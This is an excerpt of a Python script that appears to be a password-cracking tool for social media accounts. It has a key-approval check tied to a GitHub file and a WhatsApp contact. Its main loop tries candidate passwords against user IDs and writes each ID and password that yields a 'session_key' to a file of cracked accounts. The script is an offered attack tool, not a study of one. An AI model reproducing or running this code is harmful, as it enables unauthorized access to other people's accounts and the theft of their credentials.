...
def mang_check():
  ...
  id = "ANKIT-DONA"+"H".join(uuid)
  os.system("clear")
  print(logo)
  try: 
    httpCaht = requests.get("https://github.com/Nikhildahal1/approval.txt/blob/main/approval.txt").text 
    if id in httpCaht: 
      print("\x1b[1;92m[•]\033[1;37m ━\x1b[1;92m SECURITY CHECK ........ ")
      time.sleep(5)
      clear()
      print("\x1b[1;92m[•]\033[1;37m ━\033[1;37m CONGRATULATIONS YOUR KEY IS ALREADY APPROVED")
      time.sleep(2)
      clear()
      print("\x1b[1;92m[•]\033[1;37m ━\x1b[1;92m WELCOME TO ANKIT TOOL.. \033[1;37m ENJOY ")
      msg = str(os.geteuid()) 
      time.sleep(1) 
      pass 
    else: 
      print('\x1b[1;92m[•]\033[1;37m ━\x1b[1;92m YOUR KEY IS NOT \033[91;1mAPPROVED ')
      linex()
      print(f"\x1b[1;92m[•]\033[1;37m ━\x1b[1;92m YOUR KEY : " + id)
      linex()
      input('\x1b[1;92m[•]\033[1;37m ━\x1b[1;92m PRESS ENTER TO SEND KEY TO \33[1;37mANKIT DONA\33[0;30m')
      os.system("xdg-open https://wa.me/++9779807298843?text="+id)
      time.sleep(1) 
      sys.exit() 
  except: 
    sys.exit() 
...
def auto_pass(fileeee):
    ...
    print(cox)
    print("  [✓] Id Save: /sdcard/Ankit-Dona-liveids.txt")
    print(cox)
...
def file_subb(uid,pwx):
    global oks,loop,cps
    sys.stdout.write(f"\r  \033[38;5;46m[RONISH-XD] {loop}|{str(len(oks))}");sys.stdout.flush()
    ...
    try:
        for ps in pwx:
            ...
            if "session_key" in q:
                ...
                open("/sdcard/Ronish-Ok.txt","a").write(uid+"|"+ps+"\n")
                oks.append(uid)
                break
